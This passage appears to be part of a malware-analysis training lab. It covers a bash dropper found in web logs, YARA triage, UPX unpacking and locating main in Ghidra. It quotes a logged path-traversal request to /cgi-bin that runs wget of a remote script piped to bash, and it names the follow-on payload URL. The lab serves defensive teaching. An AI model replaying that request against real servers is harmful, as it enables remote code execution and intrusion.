## Investigating The Bash Dropper
Revisiting the odd entry we found in the 01_Log_Analysis section, a script was hosted at host "linux-mirrors.com/broc2022".
Go and fetch that within the Vagrant environment for analysis. Consider in a real world situation, you'd never want to 
do this from a machine that is identifiable to you or your organization. Secure networking and safe malware detonation environments are key for malware analysis.

``` sh
147.182.251.241 - - [12/Mar/2022:23:43:15 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -c wget irc.linux-mirrors.com/broc2022/gplatepwn.sh | bash HTTP/1.1" 200 1889 "-" "python-requests/2.27.1"
```

Leveraging a text editor of your choice, analyze what the script does. 

* [ ] Are there additional payloads? 
* [ ] Are there any links to potential personas?
* [ ] Are there host base indicators that you could build YARA rules for?

<details><summary> Answer: Additional payloads </summary>
* Yes!, located at: linux-mirrors.com/abcedfgabcedfg/avatar.tar.gz
</details>

<details><summary> Answer: Additional potential personas</summary>
* Yes!, the public keys are being obtained from github user "Henry Ettahots".
</details>

<details><summary> Answer: Host based IoCS</summary>
* Yes!, the /tmp/.gplate directory appears to be a staging directory for APT585.
</details>


## Yara - Has anyone seen this before?
It's far too time consuming to manually analyze every single suspicious sample that
comes into your life. Stand on the shoulders of giants and leverage YARA rules to help quickly triage
things that may be interesting/important to dive into. When leveraging automated tools for analysis consider their limiations. 
For example, are the YARA rules you're using from a well known repo or just something random you found on the internet?


``` sh
$> 
```

* Did anything hit on a yara rule?
* What what the yara rule?

## Ghidra Triage
Before loading the binary into Ghidra, let's run strings on the binary. 
Are there anything that indicates we'd have issues in loading and analyzing the binary?
If so, how do we fix this?

<details><summary> Answer: Fixing the binary to be loaded</summary>
* Yes!, binary is packed with UPX. Running strings will show "UPX!" in the output, but loading the binary
would also show this into two segments. For more info on identifying UPX packed executables checkout  [this blog](https://www.archcloudlabs.com/projects/ghidra_scripting_01/).
To unpack the binary, execute:

``` sh
$> upx -d name_of_binary.bin
```
</details>


Now, load the binary into Ghidra and let's find main!
Referencing the slides, remember the sequence is:
1. find ```entry``` within the symbol tree.
2. find ```__libc_start_main``` within entry, and the first argument is the main function.
Dive into the __libc_start_main structure [here](https://refspecs.linuxfoundation.org/LSB_2.0.1/LSB-Core/LSB-Core/baselib---libc-start-main-.html).
* Are there any interesting strings in this main function?
3. From what we discussed in the course, "clean up" main's decompilation and try to identify interesting strings.

## strace triage
